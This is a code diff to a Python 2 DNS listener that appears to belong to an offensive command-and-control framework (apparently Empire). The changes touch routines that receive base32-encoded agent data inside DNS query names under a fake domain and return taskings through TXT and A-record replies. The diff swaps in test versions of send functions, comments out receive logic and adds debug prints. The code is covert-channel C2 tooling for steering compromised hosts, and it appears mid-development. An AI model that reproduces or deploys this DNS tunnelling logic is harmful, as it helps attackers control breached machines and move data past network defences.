@@ -620,10 +620,16 @@ def send_message(packets=None):
         return a_decode
     
     def process_tasking_txt(self, hostname, sock, payload, addr, ipack, txtstoptransfer, reply_id, reply_qd):
-        self.send_txt_record_reply_id(sock, hostname, ipack, addr)
-        txt_request, txt_addr = sock.recvfrom(512)
+        self.send_txt_record_reply_id_test(sock, hostname, ipack, addr, reply_id, reply_qd)
+        
+        # txt_request, txt_addr = sock.recvfrom(512)
+        # txt_dns = DNS(txt_request)
+        # txt_host = str(txt_dns[DNSQR].qname)
+        # txt_reply_id = txt_dns.id
+        # txt_reply_qd = txt_dns.qd
 
-        self.send_payload_via_txt(hostname, sock, payload, txt_addr, txtstoptransfer, reply_id, reply_qd)
+        #self.send_payload_via_txt(txt_host, sock, payload, txt_addr, txtstoptransfer, txt_reply_id, txt_reply_qd)
+        self.send_payload_via_txt_test(sock, payload, txtstoptransfer)
         
     def stop_data_transfer(self, sock, host, port, txtstoptransfer, hostname, reply_id):
         #sock.sendto(bytes("EOF"),(host, int(port)))
@@ -658,7 +664,7 @@ def send_message(packets=None):
 
             try:
                 recv_counter = int(filter(str.isdigit, hostname))
-            except ValueError as e:
+            except ValueError:
                 recv_counter = 0
                 
             print "send_payload_via_txt - hostname {} counter {} recv_counter {}".format(hostname, counter, recv_counter)
@@ -740,11 +746,10 @@ def send_message(packets=None):
             data,server_dns=sock.recvfrom(512)
             a_dns = DNS(data)
             print "[PROCESS] recv hostname {}".format(a_dns[DNSQR].qname.decode('ascii'))
+            a_host = a_dns[DNSQR].qname.decode('ascii')
             if self.is_eof_response(a_dns):
                 print "[PROCESS] BREAKING"
-                self.send_a_record_reply_id(sock, a_dns[DNSQR].qname.decode('ascii'), ipeof, server_dns, a_dns.id, a_dns.qd)
                 break
-            a_host = a_dns[DNSQR].qname.decode('ascii')
             a_host = a_host.replace('.' + fake_domain, "")
             a_array = a_host.split('.')
             # remove prefix + suffix
@@ -761,14 +766,15 @@ def send_message(packets=None):
         print "[PROCESS] About to decode {}".format(a_base32)
         routingPacket = base64.b32decode(a_base32)
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
-        print "Got result {} for IP {}".format(dataResults, addr[0])
-        # FIXME can only send a reply in response to an actual request!
+
         if dataResults and len(dataResults) > 0:
             for (language, results) in dataResults:
-                if results:        
+                if results:
+                    print "[PROCESS] Taskings exists for agent, sending reply to host {} with ipaddr {} to IP address {} port {}".format(a_host, ipswitchatotxt, server_dns[0], server_dns[1])
                     self.send_a_record_reply_id(sock, a_host, ipswitchatotxt, server_dns, a_dns.id, a_dns.qd)
                     return results
                 else:
+                    print "[PROCESS] No taskings exists for agent, sending reply to {}".format(a_host)
                     self.send_a_record_reply_id(sock, a_host, ipnop, server_dns, a_dns.id, a_dns.qd)
                     return None
                             
@@ -865,7 +871,7 @@ def send_message(packets=None):
         stagefive_results  = ""
         tasking_results = ""
         txtstoptransfer = txtstoptransfer + '.' + fake_domain
-        
+
         # start DNS server here
         print helpers.color('[+] listeners/dns start_server(): starting the server')
         sock = socket(AF_INET, SOCK_DGRAM)
